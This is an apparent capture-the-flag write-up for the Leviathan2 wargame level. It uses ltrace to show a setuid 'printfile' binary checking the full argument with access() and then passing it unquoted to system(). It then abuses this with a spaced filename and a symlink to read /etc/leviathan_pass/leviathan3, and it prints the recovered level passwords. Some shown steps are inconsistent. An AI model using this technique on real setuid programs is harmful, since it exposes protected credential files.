Leviathan2 presents us with a small binary that belongs to the user leviathan3 and group leviathan2. The program contains a small security hole that can be exploited using a symbolic link.  To understand how the program functions at it’s core and what is happening behind the scenes when the program executes, we will use a few Linux commands and techniques to enlighten us with this information.

leviathan2@melissa:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 2012-06-28 14:54 .
drwxr-xr-x 150 root       root       4096 2013-01-03 16:39 ..
-rw-r--r--   1 root       root        220 2011-03-31 23:20 .bash_logout
-rw-r--r--   1 root       root       3353 2011-03-31 23:20 .bashrc
-r-sr-x---   1 leviathan3 leviathan2 7293 2012-06-28 14:54 printfile
-rw-r--r--   1 root       root        675 2011-03-31 23:20 .profile
 
#Running "printfile" we can see that it wants a file path argument:
 
leviathan2@melissa:~$ ./printfile*** File Printer ***Usage: ./printfile filename
 
#Let's feed it a test file and trace what is happening with ltrace:
 
leviathan2@melissa:~$ echo "input" /tmp/lev3work
input /tmp/lev3work
leviathan2@melissa:~$ ./printfile /tmp/lev3work
You cant have that file...
leviathan2@melissa:~$ ltrace ./printfile /tmp/lev3work
__libc_start_main(0x80484d4, 2, -10268, 0x80485b0, 0x8048610 <unfinished ...>
access("/tmp/lev3work", 4)                          = -1
puts("You cant have that file..."You cant have that file...
)               = 27
+++ exited (status 1) +++
 
#We can see that the function access is being called on the file.
#What access() does is check permissions based on the process's
#real user ID rather than the effective user ID.
 
leviathan2@melissa:~$ ./printfile "/tmp/lev3work lev3file"
/bin/cat: /tmp/lev3work: Is a directory
/bin/cat: lev3file: No such file or directory
 
#The program is now giving us another big hint. It is simply
#using cat to pull the file contents as we see with lev3file.
 
leviathan2@melissa:~$ ltrace ./printfile "/tmp/lev3work lev3file"
__libc_start_main(0x80484d4, 2, -10268, 0x80485b0, 0x8048610 <unfinished ...>
access("/tmp/lev3work lev3file", 4)              = 0
snprintf("/bin/cat /tmp/lev3work lev3file", 511, "/bin/cat %s", "/tmp/lev3work lev3file") = 31
system("/bin/cat /tmp/lev3work lev3file"/bin/cat: /tmp/lev3work: Is a directory
/bin/cat: lev3file: No such file or directory
<unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++
 
#So, what is happening here is a small security hole in how this program functions. While access does
#use the full file path on a file, the cat on the second file is not using the full file path. This can
#be exploited if we create a symbolic link from the password file to the file we created in /tmp.
 
leviathan2@melissa:~$ ln -s /etc/leviathan_pass/leviathan3 "/tmp/lev3work/lev3file"
 
leviathan2@melissa:/tmp/lev3work$ ~/printfile "/tmp/lev3work lev3file"
/bin/cat: /tmp/lev3work: Is a directory
Ahdiemoo1j



Finally we have forced the program to print out the contents of leviathan3′s password file using a symbolic link. Check out the reference pages for the access() and ltrace for some background.


vuH0coox6m